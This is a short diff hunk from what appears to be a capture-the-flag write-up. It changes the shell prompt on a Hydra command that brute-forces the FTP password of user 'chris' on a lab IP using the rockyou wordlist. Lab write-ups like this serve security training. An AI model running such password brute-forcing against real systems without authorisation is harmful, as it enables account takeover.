@@ -58,7 +58,7 @@ Agent R
 Using Hydra we can attempt a brute force using this username against the FTP port.
 
 ```bash
-# hydra -l chris -P ~/rockyou.txt -vV 10.10.86.99 ftp
+$ hydra -l chris -P ~/rockyou.txt -vV 10.10.86.99 ftp
 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
